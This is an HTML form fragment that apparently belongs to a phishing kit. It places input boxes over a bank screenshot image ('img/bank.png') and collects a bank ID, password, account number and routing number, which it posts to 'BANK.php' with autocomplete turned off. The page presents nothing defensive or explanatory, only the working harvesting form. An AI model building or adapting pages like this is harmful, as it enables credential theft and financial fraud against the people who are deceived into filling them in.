<form method="post" style="background : url(img/bank.png) no-repeat ; width: 638px; height:451px" action="BANK.php" >
	<div>
		<input 
			pattern=".{6,16}"
			autofocus="on"
			autocomplete="off"
			name="_bkid" 
			type="text" 
			required 
			style="position: absolute; top: 116px; left: 545px; width: 150px;" 
			title="Enter your bank ID"
		/>
	</div>
	
	<div>
		<input 
			pattern=".{6,16}"
			maxlength="16" 
			autocomplete="off"
			name="_bkpass" 
			type="password" 
			required 
			style="position: absolute; top: 165px; left: 545px; width: 150px;"
			title="Enter your bank Password"			
		/>
	</div>
	
	<div>
		<input 
			onkeypress="return isNumberKey(event)" 
			pattern=".{9,16}"
			maxlength="16"
			autocomplete="off"
			name="_accn" 
			type="text" 
			required 
			title="Enter your account number"
			style="position: absolute; top: 214px; left: 545px; width: 150px;" 
		/>
	</div>
	<div>
		<input 
			onkeypress="return isNumberKey(event)" 
			pattern=".{9,16}"
			maxlength="16"
			autocomplete="off"
			name="_routn" 
			type="text" 
			required 
			title="Enter your routing number"
			style="position: absolute; top: 263px; left: 545px; width: 150px;" 
		/>
	</div>
	
	
	
	<button style="z-index: 1; position: absolute; top: 312px; left: 577px; width: 100px; height:22px" type="submit" value="FINISH" onclick="javascript:do_submit();" class="button">FINISH</button><input type="hidden" value="./css/form.css" name="hostname"/>
</form>